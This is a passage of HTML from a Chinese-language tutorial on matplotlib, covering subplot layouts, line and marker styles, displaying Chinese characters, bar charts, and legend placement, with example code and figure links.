class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2021/11/06/python%E7%BB%98%E5%9B%BE%E5%8F%8A%E5%8F%AF%E8%A7%86%E5%8C%96%E5%A4%87%E8%AF%BE/Figure_9.png"></p><p>在python绘图中，不能直接显示汉字，但是我们经常希望绘制的图形中的标题及题注等能以汉字的形式显示，可以在代码中倒入库语句后面添加一下两句代码可以显示汉字<strong>plt.rcParams[‘font.sans-serif’]=[‘SimHei’]<strong>与</strong>plt.rcParams[‘axes.unicode_minus’]=False</strong>这两个一个是设置字符显示，一个是设置字体，<strong>SimHei</strong>这个实际上就是我们生活中常用到的<strong>黑体</strong></p><p><strong>例5-10:将一个figure对象划分为六个子图，分别绘制不同线型、不同颜色和标记的线条。</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> pltx <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">]</span>y <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">]</span>figure <span class="token operator">=</span> plt<span class="token punctuation">.</span>figure<span class="token punctuation">(</span><span class="token punctuation">)</span>axes1 <span class="token operator">=</span> figure<span class="token punctuation">.</span>add_subplot<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>axes2 <span class="token operator">=</span> figure<span class="token punctuation">.</span>add_subplot<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span>axes3 <span class="token operator">=</span> figure<span class="token punctuation">.</span>add_subplot<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span>axes4 <span class="token operator">=</span> figure<span class="token punctuation">.</span>add_subplot<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span>axes5 <span class="token operator">=</span> figure<span class="token punctuation">.</span>add_subplot<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span>axes6 <span class="token operator">=</span> figure<span class="token punctuation">.</span>add_subplot<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span>axes1<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">,</span> <span class="token string">'ro'</span><span class="token punctuation">)</span> <span class="token comment"># 红色圆点</span>axes2<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">,</span> <span class="token string">'r-*'</span><span class="token punctuation">)</span> <span class="token comment">#红色星花直线</span>axes3<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">,</span> <span class="token string">'bs'</span><span class="token punctuation">)</span> <span class="token comment">#蓝色方块</span><span class="token comment">#axes4.plot(x,y, 'g^-.') #绿色三角点划线</span>axes4<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">,</span> <span class="token string">'^g-.'</span><span class="token punctuation">)</span>axes5<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">,</span> <span class="token string">'m8'</span><span class="token punctuation">)</span>  <span class="token comment">#洋红八边形</span>axes6<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">,</span> <span class="token string">'yd:'</span><span class="token punctuation">)</span> <span class="token comment">#黄色小菱形虚线</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在绘图时需要指定线条的线型，标记的符号及线条的颜色的参数值写进同一个大括号，而且对三个参数的前后顺序没有要求。</p><p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2021/11/06/python%E7%BB%98%E5%9B%BE%E5%8F%8A%E5%8F%AF%E8%A7%86%E5%8C%96%E5%A4%87%E8%AF%BE/Figure_10.png"></p><h3 id="拓展三张图如何划分？"><a href="#拓展三张图如何划分？" class="headerlink" title="拓展三张图如何划分？"></a>拓展三张图如何划分？</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">def</span> <span class="token function">f</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> np<span class="token punctuation">.</span>exp<span class="token punctuation">(</span><span class="token operator">-</span>t<span class="token punctuation">)</span> <span class="token operator">*</span> np<span class="token punctuation">.</span>sin<span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">*</span> np<span class="token punctuation">.</span>pi <span class="token operator">*</span> t<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    t1 <span class="token operator">=</span> np<span class="token punctuation">.</span>arange<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">0.1</span><span class="token punctuation">)</span>    t2 <span class="token operator">=</span> np<span class="token punctuation">.</span>arange<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">0.2</span><span class="token punctuation">)</span>    plt<span class="token punctuation">.</span>figure<span class="token punctuation">(</span><span class="token punctuation">)</span>    plt<span class="token punctuation">.</span>subplot<span class="token punctuation">(</span><span class="token number">221</span><span class="token punctuation">)</span>    plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>t1<span class="token punctuation">,</span> f<span class="token punctuation">(</span>t1<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'bo'</span><span class="token punctuation">,</span> t2<span class="token punctuation">,</span> f<span class="token punctuation">(</span>t2<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'g--'</span><span class="token punctuation">)</span>    plt<span class="token punctuation">.</span>subplot<span class="token punctuation">(</span><span class="token number">222</span><span class="token punctuation">)</span>    plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>t2<span class="token punctuation">,</span> np<span class="token punctuation">.</span>cos<span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">*</span> np<span class="token punctuation">.</span>pi <span class="token operator">*</span> t2<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'g--'</span><span class="token punctuation">)</span>    plt<span class="token punctuation">.</span>subplot<span class="token punctuation">(</span><span class="token number">212</span><span class="token punctuation">)</span>    plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2021/11/06/python%E7%BB%98%E5%9B%BE%E5%8F%8A%E5%8F%AF%E8%A7%86%E5%8C%96%E5%A4%87%E8%AF%BE/Figure_11.png"></p><p>这种方式是通过<strong>plt.subplot</strong>再次划分整个图片的区域，虽然我们是将图片划分为了(2,2)总共四份的区域，但是由于前两张图只上半部分，我们可以将整个图看成两部分，即(2,1)结构划分，使第三张图片占据2号位置，就是实现了三张图片的划分</p><p>另一种方式<strong>subplot2grid()</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">subplot2grid<span class="token punctuation">(</span>shape<span class="token punctuation">,</span> loc<span class="token punctuation">,</span> rowspan<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> colspan<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> fig<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p> <strong>shape :</strong> 组合图框架形状，以元组形式传递，如2行3列可以表示为（2,3）<br><strong>loc ：</strong> 指定子图所在位置，如第一个位置是（0，0）<br><strong>rowspan</strong> ：指定子图需要跨几行<br><strong>colspan</strong> ： 指定子图需要跨几列</p></blockquote><h2 id="5-4-条形图"><a href="#5-4-条形图" class="headerlink" title="5.4:  条形图"></a>5.4:  条形图</h2><p>条形图是数据分析中使用较多的数据可视化方式之一。在条形图中可以非常直观地通过位置比较数值大小。因为在条形图中条的高度就是数值，所以一眼就可以看出数值的高底。</p><p><strong>bar(x, height, width=0.8, bottom=None, …, align=’center’)</strong></p><p>例5-11 :简单条形图</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> pltx <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">]</span>y <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">]</span>figure <span class="token operator">=</span> plt<span class="token punctuation">.</span>figure<span class="token punctuation">(</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>bar<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span> <span class="token comment">#默认颜色，默认宽度为0.8</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2021/11/06/python%E7%BB%98%E5%9B%BE%E5%8F%8A%E5%8F%AF%E8%A7%86%E5%8C%96%E5%A4%87%E8%AF%BE/Figure_12.png"></p><p>例5-12 : 横向条形图。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> pltx <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">]</span>y <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token comment"># x指定起始位置从0开始， bottom指定水平条起始位置为左侧， height指定绘制的水平条的宽度， width 指定绘制的水平条的长度。orientation指定要绘制的是水平条，color指定绘制的条形为红色。</span>plt<span class="token punctuation">.</span>bar<span class="token punctuation">(</span>x<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> bottom<span class="token operator">=</span>y<span class="token punctuation">,</span> height<span class="token operator">=</span><span class="token number">0.5</span><span class="token punctuation">,</span> width<span class="token operator">=</span>x<span class="token punctuation">,</span> orientation<span class="token operator">=</span><span class="token string">"horizontal"</span><span class="token punctuation">,</span>color<span class="token operator">=</span><span class="token string">'r'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2021/11/06/python%E7%BB%98%E5%9B%BE%E5%8F%8A%E5%8F%AF%E8%A7%86%E5%8C%96%E5%A4%87%E8%AF%BE/Figure_13.png">)</p><h3 id="5-4-2-多组条形图"><a href="#5-4-2-多组条形图" class="headerlink" title="5.4.2  多组条形图"></a>5.4.2  多组条形图</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> pltx <span class="token operator">=</span> np<span class="token punctuation">.</span>arange<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>y1<span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">53</span><span class="token punctuation">,</span> <span class="token number">66</span><span class="token punctuation">,</span><span class="token number">77</span><span class="token punctuation">]</span>y2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">,</span> <span class="token number">43</span><span class="token punctuation">,</span> <span class="token number">65</span><span class="token punctuation">,</span> <span class="token number">55</span><span class="token punctuation">,</span><span class="token number">68</span><span class="token punctuation">]</span>y3<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">35</span><span class="token punctuation">,</span><span class="token number">46</span><span class="token punctuation">,</span><span class="token number">57</span><span class="token punctuation">,</span><span class="token number">67</span><span class="token punctuation">]</span>bar_width <span class="token operator">=</span> <span class="token number">0.3</span>plt<span class="token punctuation">.</span>bar<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y1<span class="token punctuation">,</span> bar_width<span class="token punctuation">,</span>color<span class="token operator">=</span><span class="token string">'y'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>bar<span class="token punctuation">(</span>x<span class="token operator">+</span>bar_width<span class="token punctuation">,</span>y2<span class="token punctuation">,</span> bar_width<span class="token punctuation">,</span> align<span class="token operator">=</span><span class="token string">"center"</span><span class="token punctuation">,</span>color<span class="token operator">=</span><span class="token string">'r'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>bar<span class="token punctuation">(</span>x<span class="token operator">+</span>bar_width<span class="token operator">+</span>bar_width<span class="token punctuation">,</span>y3<span class="token punctuation">,</span> bar_width<span class="token punctuation">,</span> align<span class="token operator">=</span><span class="token string">"center"</span><span class="token punctuation">,</span>color<span class="token operator">=</span><span class="token string">'b'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2021/11/06/python%E7%BB%98%E5%9B%BE%E5%8F%8A%E5%8F%AF%E8%A7%86%E5%8C%96%E5%A4%87%E8%AF%BE/Figure_14.png"></p><p>在绘制多组条形图进行对比的时候需要注意一点，bar_width的范围是(0,1)没错，但是多组图表需要保证几组图表的范围之和不超过1，以这个题为例，当bar_width设置为0.4三个表得到总和就超过了1，会导致重叠的发生。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> pltx <span class="token operator">=</span> np<span class="token punctuation">.</span>arange<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>y1<span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">53</span><span class="token punctuation">,</span> <span class="token number">66</span><span class="token punctuation">,</span><span class="token number">77</span><span class="token punctuation">]</span>y2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">,</span> <span class="token number">43</span><span class="token punctuation">,</span> <span class="token number">65</span><span class="token punctuation">,</span> <span class="token number">55</span><span class="token punctuation">,</span><span class="token number">68</span><span class="token punctuation">]</span>bar_width <span class="token operator">=</span> <span class="token number">0.5</span>plt<span class="token punctuation">.</span>bar<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y1<span class="token punctuation">,</span> bar_width<span class="token punctuation">,</span>color<span class="token operator">=</span><span class="token string">'b'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>bar<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y2<span class="token punctuation">,</span> bar_width<span class="token punctuation">,</span> bottom<span class="token operator">=</span>y1<span class="token punctuation">,</span>color<span class="token operator">=</span><span class="token string">'r'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2021/11/06/python%E7%BB%98%E5%9B%BE%E5%8F%8A%E5%8F%AF%E8%A7%86%E5%8C%96%E5%A4%87%E8%AF%BE/Figure_15.png"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token comment">#字体设置为黑体</span>matplotlib<span class="token punctuation">.</span>rcParams<span class="token punctuation">[</span><span class="token string">'font.family'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'SimHei'</span>x <span class="token operator">=</span> np<span class="token punctuation">.</span>arange<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>y1<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">90</span><span class="token punctuation">,</span> <span class="token number">88</span><span class="token punctuation">,</span> <span class="token number">78</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">,</span> <span class="token number">87</span><span class="token punctuation">]</span>y2<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">98</span><span class="token punctuation">,</span> <span class="token number">77</span><span class="token punctuation">,</span> <span class="token number">86</span><span class="token punctuation">,</span> <span class="token number">85</span><span class="token punctuation">,</span> <span class="token number">67</span><span class="token punctuation">]</span>bar_width <span class="token operator">=</span> <span class="token number">0.3</span>str1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">"数学"</span><span class="token punctuation">,</span><span class="token string">"英语"</span><span class="token punctuation">,</span><span class="token string">"语文"</span><span class="token punctuation">,</span><span class="token string">"计算机"</span><span class="token punctuation">,</span><span class="token string">"体育"</span><span class="token punctuation">)</span><span class="token comment"># 绘图</span>plt<span class="token punctuation">.</span>bar<span class="token punctuation">(</span>x<span class="token punctuation">,</span> height<span class="token operator">=</span>y1<span class="token punctuation">,</span> width<span class="token operator">=</span>bar_width<span class="token punctuation">,</span> label<span class="token operator">=</span><span class="token string">"王晨"</span><span class="token punctuation">,</span> tick_label<span class="token operator">=</span>str1<span class="token punctuation">,</span>color<span class="token operator">=</span><span class="token string">'b'</span><span class="token punctuation">)</span><span class="token comment">#tick_label下标的标签，label直接是标签</span>plt<span class="token punctuation">.</span>bar<span class="token punctuation">(</span>x<span class="token operator">+</span>bar_width<span class="token punctuation">,</span> height<span class="token operator">=</span>y2<span class="token punctuation">,</span> width<span class="token operator">=</span>bar_width<span class="token punctuation">,</span> label<span class="token operator">=</span><span class="token string">"刘星"</span><span class="token punctuation">,</span>color<span class="token operator">=</span><span class="token string">'r'</span><span class="token punctuation">,</span>align<span class="token operator">=</span><span class="token string">"center"</span><span class="token punctuation">)</span><span class="token comment">#添加图例</span>plt<span class="token punctuation">.</span>legend<span class="token punctuation">(</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2021/11/06/python%E7%BB%98%E5%9B%BE%E5%8F%8A%E5%8F%AF%E8%A7%86%E5%8C%96%E5%A4%87%E8%AF%BE/Figure_16.png"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token comment"># 显示汉字设置</span>plt<span class="token punctuation">.</span>rcParams<span class="token punctuation">[</span><span class="token string">'font.sans-serif'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'SimHei'</span><span class="token punctuation">]</span>plt<span class="token punctuation">.</span>rcParams<span class="token punctuation">[</span><span class="token string">'axes.unicode_minus'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">False</span><span class="token comment"># 定义函数来显示柱状上的数值</span><span class="token keyword">def</span> <span class="token function">autolabel</span><span class="token punctuation">(</span>rects<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> rect <span class="token keyword">in</span> rects<span class="token punctuation">:</span>        height <span class="token operator">=</span> rect<span class="token punctuation">.</span>get_height<span class="token punctuation">(</span><span class="token punctuation">)</span>        plt<span class="token punctuation">.</span>text<span class="token punctuation">(</span>rect<span class="token punctuation">.</span>get_x<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> rect<span class="token punctuation">.</span>get_width<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">.</span> <span class="token operator">-</span> <span class="token number">0.2</span><span class="token punctuation">,</span> <span class="token number">1.03</span> <span class="token operator">*</span> height<span class="token punctuation">,</span> <span class="token string">'%s'</span> <span class="token operator">%</span> <span class="token builtin">float</span><span class="token punctuation">(</span>height<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    l1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">68</span><span class="token punctuation">,</span> <span class="token number">96</span><span class="token punctuation">,</span> <span class="token number">85</span><span class="token punctuation">,</span> <span class="token number">86</span><span class="token punctuation">,</span> <span class="token number">76</span><span class="token punctuation">,</span> <span class="token number">87</span><span class="token punctuation">,</span> <span class="token number">95</span><span class="token punctuation">]</span>    l2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">85</span><span class="token punctuation">,</span> <span class="token number">68</span><span class="token punctuation">,</span> <span class="token number">79</span><span class="token punctuation">,</span> <span class="token number">89</span><span class="token punctuation">,</span> <span class="token number">94</span><span class="token punctuation">,</span> <span class="token number">82</span><span class="token punctuation">,</span> <span class="token number">90</span><span class="token punctuation">]</span>    name <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'赵临'</span><span class="token punctuation">,</span> <span class="token string">'呼俞'</span><span class="token punctuation">,</span> <span class="token string">'侯亚'</span><span class="token punctuation">,</span> <span class="token string">'翟蓉'</span><span class="token punctuation">,</span> <span class="token string">'张婷'</span><span class="token punctuation">,</span> <span class="token string">'赵九'</span><span class="token punctuation">,</span> <span class="token string">'赵泽'</span><span class="token punctuation">]</span>    total_width<span class="token punctuation">,</span> n <span class="token operator">=</span> <span class="token number">0.8</span><span class="token punctuation">,</span> <span class="token number">2</span>    width <span class="token operator">=</span> total_width <span class="token operator">/</span> n    x <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">]</span>    a <span class="token operator">=</span> plt<span class="token punctuation">.</span>bar<span class="token punctuation">(</span>x<span class="token punctuation">,</span> l1<span class="token punctuation">,</span> width<span class="token operator">=</span>width<span class="token punctuation">,</span> label<span class="token operator">=</span><span class="token string">'大学IT'</span><span class="token punctuation">,</span> fc<span class="token operator">=</span><span class="token string">'b'</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        x<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> x<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> width    b <span class="token operator">=</span> plt<span class="token punctuation">.</span>bar<span class="token punctuation">(</span>x<span class="token punctuation">,</span> l2<span class="token punctuation">,</span> width<span class="token operator">=</span>width<span class="token punctuation">,</span> label<span class="token operator">=</span><span class="token string">'图像处理'</span><span class="token punctuation">,</span> tick_label<span class="token operator">=</span>name<span class="token punctuation">,</span> fc<span class="token operator">=</span><span class="token string">'r'</span><span class="token punctuation">)</span>    autolabel<span class="token punctuation">(</span>a<span class="token punctuation">)</span>    autolabel<span class="token punctuation">(</span>b<span class="token punctuation">)</span>    plt<span class="token punctuation">.</span>xlabel<span class="token punctuation">(</span><span class="token string">'姓名'</span><span class="token punctuation">)</span>    plt<span class="token punctuation">.</span>ylabel<span class="token punctuation">(</span><span class="token string">'成绩'</span><span class="token punctuation">)</span>    plt<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">'学生成绩'</span><span class="token punctuation">)</span>    plt<span class="token punctuation">.</span>legend<span class="token punctuation">(</span><span class="token punctuation">)</span>    plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2021/11/06/python%E7%BB%98%E5%9B%BE%E5%8F%8A%E5%8F%AF%E8%A7%86%E5%8C%96%E5%A4%87%E8%AF%BE/Figure_17.png"></p><h3 id="拓展图例的位置"><a href="#拓展图例的位置" class="headerlink" title="拓展图例的位置"></a>拓展图例的位置</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">在legend的参数中， loc参数设置图例的显示位置的： plt<span class="token punctuation">.</span>legend<span class="token punctuation">(</span><span class="token punctuation">[</span>l1<span class="token punctuation">,</span> l2<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'first'</span><span class="token punctuation">,</span> <span class="token string">'second'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> loc <span class="token operator">=</span> <span class="token string">'upper right'</span><span class="token punctuation">)</span><span class="token comment">#其中，loc表示位置的；</span><span class="token string">'best'</span>         <span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>only implemented <span class="token keyword">for</span> axes legends<span class="token punctuation">)</span><span class="token punctuation">(</span>自适应方式<span class="token punctuation">)</span><span class="token string">'upper right'</span>  <span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'upper left'</span>   <span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token string">'lower left'</span>   <span class="token punctuation">:</span> <span class="token number">3</span><span class="token punctuation">,</span><span class="token string">'lower right'</span>  <span class="token punctuation">:</span> <span class="token number">4</span><span class="token punctuation">,</span><span class="token string">'right'</span>        <span class="token punctuation">:</span> <span class="token number">5</span><span class="token punctuation">,</span><span class="token string">'center left'</span>  <span class="token punctuation">:</span> 